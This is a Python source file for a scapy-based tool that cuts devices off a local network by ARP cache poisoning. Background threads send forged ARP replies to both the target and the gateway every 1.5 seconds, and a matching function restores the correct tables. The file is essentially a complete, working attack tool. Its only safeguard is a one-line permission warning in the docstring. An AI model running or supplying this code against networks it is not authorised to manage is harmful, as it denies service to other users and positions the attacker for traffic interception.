"""
ARP spoofing manager for cutting/restoring device network access.

How it works:
  - To CUT a device: send fake ARP replies to the target telling it the
    gateway's MAC is our MAC, AND send fake ARP replies to the gateway
    telling it the target's MAC is our MAC. Since we don't forward the
    packets (IP forwarding disabled for cut targets), the device loses
    internet access.
  - To RESTORE a device: send correct ARP packets to both the target and
    the gateway to fix their ARP tables.

WARNING: Only use on networks you own or have explicit permission to manage.
"""
import threading
import time
import logging
from typing import Dict, Optional
from scapy.all import ARP, Ether, send, get_if_hwaddr, conf

logger = logging.getLogger(__name__)


def get_mac(ip: str, iface: str) -> Optional[str]:
    """Get MAC address for an IP via ARP request."""
    from scapy.all import srp
    conf.verb = 0
    try:
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(ether / arp, timeout=2, iface=iface, verbose=False)[0]
        if result:
            return result[0][1].hwsrc
    except Exception:
        pass
    return None


def spoof_arp(target_ip: str, target_mac: str, spoof_ip: str, iface: str):
    """
    Send an ARP reply to target_ip/target_mac claiming spoof_ip is at our MAC.
    This poisons target's ARP cache for spoof_ip.
    """
    try:
        our_mac = get_if_hwaddr(iface)
        pkt = Ether(dst=target_mac) / ARP(
            op=2,  # ARP reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=our_mac,
        )
        send(pkt, verbose=False, iface=iface)
    except Exception as e:
        logger.error(f"[ARP] spoof error: {e}")


def restore_arp(target_ip: str, target_mac: str, restore_ip: str, restore_mac: str, iface: str):
    """
    Send a correct ARP reply to fix target's ARP cache for restore_ip.
    """
    try:
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=restore_ip,
            hwsrc=restore_mac,
        )
        send(pkt, count=5, verbose=False, iface=iface)
    except Exception as e:
        logger.error(f"[ARP] restore error: {e}")


class ARPManager:
    """Manages ARP spoofing threads for multiple devices."""

    def __init__(self):
        self._threads: Dict[str, threading.Thread] = {}
        self._stop_events: Dict[str, threading.Event] = {}
        self._lock = threading.Lock()
        self.iface: Optional[str] = None
        self.gateway_ip: Optional[str] = None
        self.gateway_mac: Optional[str] = None

    def configure(self, iface: str, gateway_ip: str, gateway_mac: str):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        conf.verb = 0

    def cut(self, device_ip: str, device_mac: str) -> bool:
        """
        Start ARP spoofing thread to cut off a device.
        Returns True if started successfully.
        """
        if not self.iface or not self.gateway_ip or not self.gateway_mac:
            logger.error("[ARP] Manager not configured")
            return False

        mac = device_mac
        if not mac:
            mac = get_mac(device_ip, self.iface)
            if not mac:
                logger.error(f"[ARP] Cannot resolve MAC for {device_ip}")
                return False

        with self._lock:
            if device_ip in self._threads and self._threads[device_ip].is_alive():
                return True  # Already cutting

            stop_event = threading.Event()
            self._stop_events[device_ip] = stop_event

            thread = threading.Thread(
                target=self._spoof_loop,
                args=(device_ip, mac, stop_event),
                daemon=True,
                name=f"arp-cut-{device_ip}",
            )
            self._threads[device_ip] = thread
            thread.start()

        logger.info(f"[ARP] Cutting {device_ip} ({mac})")
        return True

    def restore(self, device_ip: str, device_mac: str):
        """Stop ARP spoofing and restore ARP tables."""
        with self._lock:
            if device_ip in self._stop_events:
                self._stop_events[device_ip].set()
                thread = self._threads.get(device_ip)
                if thread:
                    thread.join(timeout=3)
                del self._stop_events[device_ip]
                self._threads.pop(device_ip, None)

        # Restore correct ARP entries
        if self.iface and self.gateway_ip and self.gateway_mac and device_mac:
            try:
                # Tell device: gateway is at gateway_mac
                restore_arp(device_ip, device_mac, self.gateway_ip, self.gateway_mac, self.iface)
                # Tell gateway: device is at device_mac
                our_mac = get_if_hwaddr(self.iface)
                restore_arp(self.gateway_ip, self.gateway_mac, device_ip, device_mac, self.iface)
            except Exception as e:
                logger.error(f"[ARP] restore error: {e}")

        logger.info(f"[ARP] Restored {device_ip}")

    def restore_all(self, devices: list):
        """Restore all cut devices on shutdown."""
        ips = list(self._stop_events.keys())
        for ip in ips:
            device = next((d for d in devices if d["ip"] == ip), None)
            mac = device["mac"] if device else ""
            self.restore(ip, mac)

    def is_cutting(self, device_ip: str) -> bool:
        with self._lock:
            return device_ip in self._threads and self._threads[device_ip].is_alive()

    def _spoof_loop(self, device_ip: str, device_mac: str, stop_event: threading.Event):
        """Send ARP spoofs every 1.5 seconds until stopped."""
        while not stop_event.is_set():
            try:
                # Poison device's ARP cache: gateway IP -> our MAC
                spoof_arp(device_ip, device_mac, self.gateway_ip, self.iface)
                # Poison gateway's ARP cache: device IP -> our MAC
                spoof_arp(self.gateway_ip, self.gateway_mac, device_ip, self.iface)
            except Exception as e:
                logger.error(f"[ARP] loop error: {e}")
            stop_event.wait(timeout=1.5)
